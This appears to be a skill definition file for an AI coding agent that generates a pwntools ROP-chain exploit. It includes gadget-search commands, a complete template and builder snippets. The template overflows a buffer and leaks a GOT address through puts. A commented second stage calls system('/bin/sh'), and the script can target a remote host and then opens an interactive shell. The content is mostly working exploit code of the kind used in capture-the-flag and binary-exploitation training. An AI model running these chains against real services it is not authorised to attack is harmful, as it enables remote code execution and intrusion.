---
name: pwn-rop
description: Generate ROP chain exploit template using pwntools ROP builder
argument-hint: "<binary> [--offset N]"
allowed-tools: ["Bash", "Read", "Write"]
---

# PWN ROP - ROP Chain Template

Generate a ROP chain exploit using pwntools automatic ROP builder.

## Execution Steps

### Step 1: Gather Information

- Binary path
- Offset to return address
- Target action (leak, shell, specific function call)

### Step 2: Find Available Gadgets

```bash
ROPgadget --binary <binary> --only "pop|ret" | head -30
ropper -f <binary> --search "pop"
```

### Step 3: Generate Template

Create exploit using pwntools ROP class for automatic chain building.

## Generated Template

```python
#!/usr/bin/env python3
"""
ROP Chain Exploit Template
Target: <binary>
Uses pwntools ROP builder for automatic chain construction
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'
OFFSET = <offset>

# === SETUP ===
elf = ELF(BINARY)
rop = ROP(elf)
context.binary = elf

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, 'b main\\nc')
    else:
        return process(BINARY)

def main():
    io = conn()

    # === BUILD ROP CHAIN ===

    # Example: Leak GOT entry
    rop.call('puts', [elf.got['puts']])
    rop.call('main')

    log.info("ROP Chain:")
    print(rop.dump())

    # === SEND PAYLOAD ===
    payload = flat(
        b'A' * OFFSET,
        rop.chain()
    )

    io.sendline(payload)

    # Parse leak if applicable
    leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
    log.success(f"Leak: {hex(leak)}")

    # === STAGE 2 (if needed) ===
    # Build second ROP chain with libc
    # rop2 = ROP(libc)
    # rop2.system(next(libc.search(b'/bin/sh')))

    io.interactive()

if __name__ == '__main__':
    main()
```

## ROP Builder Examples

### Call Function with Arguments

```python
rop.call('puts', [elf.got['puts']])
rop.call('printf', [elf.symbols['format_string']])
```

### Raw Gadget Insertion

```python
rop.raw(pop_rdi)
rop.raw(elf.got['puts'])
rop.raw(elf.plt['puts'])
```

### Find Gadgets Automatically

```python
# pwntools finds gadgets automatically
rop.rdi = 0x12345678  # Sets up pop rdi ; ret
```

### Chain Multiple Calls

```python
rop.call('puts', [elf.got['puts']])
rop.call('puts', [elf.got['printf']])
rop.call('main')  # Return for second stage
```
